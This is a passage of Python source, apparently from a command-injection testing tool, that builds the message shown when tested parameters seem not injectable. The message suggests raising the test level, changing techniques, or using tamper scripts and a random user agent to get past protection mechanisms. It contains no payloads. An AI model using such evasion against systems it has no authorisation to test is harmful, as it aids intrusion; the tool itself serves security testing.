      if settings.TESTABLE_PARAMETERS and len(settings.CUSTOM_HEADERS_NAMES) == 0 :
        err_msg = "All testable parameters you provided are not present within the given request data."
      else:
        err_msg = "All tested parameters "
        if menu.options.level > settings.COOKIE_INJECTION_LEVEL:
          err_msg += "and HTTP headers "
        err_msg += "appear to be not injectable."
        if menu.options.level < settings.HTTP_HEADER_INJECTION_LEVEL :
          err_msg += " Try to increase value for '--level' option"
          err_msg += " if you wish to perform more tests."
        if settings.USER_SUPPLIED_TECHNIQUE or settings.SKIP_TECHNIQUES:
          err_msg += " Rerun without providing the option "
          if not settings.SKIP_TECHNIQUES :
            err_msg += "'--technique'."
          else:
            err_msg += "'--skip-technique'."
        err_msg += " If you suspect that there is some kind of protection mechanism involved, maybe you could try to"
        if not menu.options.tamper:
          err_msg += " use option '--tamper'"
        if not menu.options.random_agent:
          if not menu.options.tamper:
            err_msg += " and/or"
          err_msg += " switch '--random-agent'"
        err_msg += "."
        if settings.MULTI_TARGETS:
          err_msg += " Skipping to the next target."
      print(settings.print_critical_msg(err_msg))
    else:
      logs.print_logs_notification(filename, url)
    if not settings.MULTI_TARGETS:
      common.show_http_error_codes()
      raise SystemExit()

  except KeyboardInterrupt:
    checks.user_aborted(filename, url)

# eof